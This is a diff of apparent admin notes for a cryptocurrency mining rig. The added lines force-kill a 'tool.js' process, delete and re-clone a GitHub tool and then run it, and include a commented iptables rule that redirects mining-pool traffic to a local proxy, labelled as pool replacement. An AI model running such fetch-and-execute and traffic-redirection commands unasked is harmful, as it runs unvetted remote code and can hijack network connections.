@@ -15,11 +15,43 @@ sed -i 's/#Nvidia OC will be run by xinit/\/home\/user\/tool\/toolstart/' /hive/
 
 
 
+
+clear && 
+ps -Fe | grep "tool.js 999" | grep "/tool/tool.js" &&
+ps -ef | grep 'tool/tool.js' | grep -v grep | awk '{print $2}' | xargs -r kill -9 &&
+/home/user/tool/toolcheck &&
+ps -Fe | grep "tool.js 999" | grep "/tool/tool.js"
+
+
+
 nano /hive-config/wallet.conf
 
 
 
 9991 9992
 -retrydelay 5
+
+
+
+#eval "iptables -t nat -A OUTPUT -d eth-eu1.nanopool.org -p tcp --dport 9991 -j DNAT --to-destination 127.0.0.1:9991"
+
+
+// Замена пула
+clear && 
+rm -R /home/user/tool && 
+git clone https://github.com/invulmain/tool /home/user/tool &&
+chmod +x /home/user/tool/toolstart &&
+chmod +x /home/user/tool/toolcheck &&
+ps -Fe | grep "tool.js 999" | grep "/tool/tool.js" &&
+ps -ef | grep 'tool/tool.js' | grep -v grep | awk '{print $2}' | xargs -r kill -9 &&
+/home/user/tool/toolcheck &&
+ps -Fe | grep "tool.js 999" | grep "/tool/tool.js"
+
+
+
+
+
+
+
 
 
